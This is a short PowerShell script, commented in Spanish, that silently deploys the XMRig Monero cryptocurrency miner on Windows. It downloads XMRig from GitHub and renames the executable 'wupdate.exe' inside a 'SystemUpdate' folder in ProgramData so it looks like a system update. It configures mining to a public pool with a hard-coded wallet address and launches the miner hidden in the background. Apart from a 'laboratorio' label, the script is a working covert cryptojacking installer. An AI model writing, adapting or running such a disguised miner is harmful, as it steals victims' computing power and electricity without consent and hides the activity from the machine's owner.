# === DEPLOY XMRig MINERO - Versión FINAL para laboratorio (silencioso + background) ===
$installPath = "C:\ProgramData\SystemUpdate"
New-Item -ItemType Directory -Path $installPath -Force | Out-Null

# Descarga y extrae
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$zipPath = "$installPath\xmrig.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
Remove-Item $zipPath -Force

# Copiar ejecutable
Copy-Item "$installPath\xmrig-6.25.0\xmrig.exe" "$installPath\wupdate.exe" -Force

# Configuración limpia
$config = @{
    autosave = $true
    cpu = @{ "max-threads-hint" = 50 }
    pools = @(
        @{
            url = "pool.supportxmr.com:3333"
            user = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd"
            pass = "x"
            keepalive = $true
            tls = $false
        }
    )
    background = $false
    "log-file" = $null
}

$configPath = "$installPath\config.json"
$config | ConvertTo-Json -Depth 10 | Set-Content -Path $configPath -Encoding UTF8NoBOM -Force

# === LANZAMIENTO SILENCIOSO (usando -B de XMRig + truco para que no se cierre) ===
$exePath = "$installPath\wupdate.exe"
Start-Process -FilePath $exePath -ArgumentList "-B -c `"$configPath`"" -WindowStyle Hidden

Write-Output "=== Minero desplegado con -B (background) ==="
